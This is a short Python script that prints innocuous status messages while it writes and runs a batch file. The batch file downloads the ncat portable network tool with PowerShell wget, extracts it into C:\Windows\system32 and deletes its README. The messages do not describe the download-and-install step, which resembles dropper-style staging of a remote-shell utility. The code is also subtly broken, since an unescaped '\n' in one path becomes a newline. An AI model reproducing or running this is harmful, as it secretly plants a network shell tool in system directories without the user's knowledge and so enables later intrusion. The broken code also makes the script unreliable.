import subprocess
print("Ok, for now")
print("It seems like it works.")
print("That's good")
TestBat = open(r'Test.bat', '+w')
TestBat.write('''@echo off
              cls
              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o ncat.zip
              powershell Expand-Archive -LiteralPath .\ncat.zip -DestinationPath C:\Windows\system32
              cd C:\Windows\system32
              del README''')
TestBat.close()
subprocess.call([r'Test.bat'])
